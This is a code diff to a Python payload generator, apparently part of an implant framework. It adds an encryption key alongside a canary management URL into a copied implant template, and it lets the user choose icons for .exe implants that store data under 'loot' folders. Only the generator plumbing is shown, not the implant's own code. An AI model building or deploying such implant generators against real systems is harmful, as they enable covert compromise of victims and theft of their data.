@@ -20,7 +20,7 @@ def animate():
         sys.stdout.flush()
         time.sleep(0.25)
 
-def generateimplant(canaryManagementURL):
+def generateimplant(canaryManagementURL,key):
     global done
     done = False
     print(Fore.BLUE + "\n[!]" + Fore.RESET + " Generating implant payload...")
@@ -34,7 +34,7 @@ def generateimplant(canaryManagementURL):
         sys.exit(0)
 
     if (implantType == "exe"):
-        # more icons can be added to the /icon folder
+        # More icons can be added to the /icon folder
         icons = os.listdir("resources/icons/")
         print(Fore.BLUE + "\n[!]" + Fore.RESET + " Available .ico files:\n")
         count = 1
@@ -81,11 +81,20 @@ def generateimplant(canaryManagementURL):
         lootpath = "loot/" + name + "/"
 
         shutil.copyfile("implant.py", "payloads/" + name + "/" + name + "_implant.py")
+        key = key.decode()
 
         with fileinput.FileInput("payloads/" + name + "/" + name + "_implant.py", inplace=True) as file:
             for line in file:
-                sys.stdout.write(
-                    line.replace('canaryManagementURL = \"\"', 'canaryManagementURL = \"' + canaryManagementURL + '\"'))
+                if 'canaryManagementURL = \"\"' in line:
+                   print('canaryManagementURL = \"' + canaryManagementURL + '\"')
+
+                elif "key = b\'" in line:
+                    print("key = b\'" + key + "\'")
+
+                else:
+                    print(line, end='')
+
+
 
         fileinput.close()
         print(Fore.BLUE + "[!]" + Fore.RESET + " Payload template successfully edited with new token...")
